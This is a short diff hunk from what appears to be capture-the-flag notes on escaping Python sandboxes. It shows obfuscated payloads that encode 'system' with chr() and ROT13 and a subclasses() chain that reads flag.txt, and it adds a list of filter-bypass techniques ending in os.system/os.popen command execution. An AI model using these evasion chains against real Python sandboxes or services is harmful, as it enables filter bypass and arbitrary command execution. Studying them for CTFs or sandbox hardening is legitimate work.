@@ -34,6 +34,15 @@ python''.join(map(chr, [115,121,115,116,101,109]))
 python'flfgrz'.translate(str.maketrans('abcdefghijklmnopqrstuvwxyz', 'nopqrstuvwxyzabcdefghijklm'))
 Try these approaches! The format string and join methods are particularly effective.
 
+  Analysis of bypass techniques:
+  1. FileLoader class access (techniques 1-2)
+  2. catch_warnings module access (techniques 3-10)
+  3. chr() encoding to bypass string detection
+  4. Hex encoding (\x5f format)
+  5. String reversal ('nepo'[::-1])
+  6. os.system/os.popen for command execution
+  7. Direct subclasses() access
+
 https://www.floyd.ch/?p=584
 
 1 >>> print(().__class__.__bases__[0].__subclasses__()[122]('flag', 'flag.txt').get_data('flag.txt'))
